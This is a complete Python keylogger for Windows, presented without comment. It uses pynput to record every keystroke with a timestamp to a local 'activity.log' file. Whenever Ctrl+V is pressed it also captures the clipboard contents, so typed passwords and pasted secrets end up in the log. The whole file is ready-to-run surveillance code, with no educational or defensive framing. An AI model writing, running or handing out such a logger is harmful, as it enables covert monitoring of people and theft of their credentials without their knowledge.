from pynput import keyboard
from datetime import datetime
import win32clipboard

LOG_FILE = "activity.log"
pressed_keys = set()

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return f"[CLIPBOARD] {data}"
    except:
        return "[CLIPBOARD] <Could not read>"

def process_key(key):
    try:
        return key.char
    except AttributeError:
        specials = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.ctrl_l: '',
            keyboard.Key.ctrl_r: '',
            keyboard.Key.shift: '',
            keyboard.Key.shift_r: '',
            keyboard.Key.alt_l: '',
            keyboard.Key.alt_r: '',
            keyboard.Key.caps_lock: '[CAPSLOCK]',
        }
        return specials.get(key, f'[{str(key).replace("Key.", "").upper()}]')

def on_press(key):
    pressed_keys.add(key)

    key_text = process_key(key)
    time_now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    
    if key_text:
        with open(LOG_FILE, "a", encoding="utf-8") as log:
            log.write(f"{time_now} -> {key_text}\n")

    
    if (keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys) and key == keyboard.KeyCode.from_char('v'):
        clip = get_clipboard()
        with open(LOG_FILE, "a", encoding="utf-8") as log:
            log.write(f"{time_now} -> {clip}\n")

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    main()
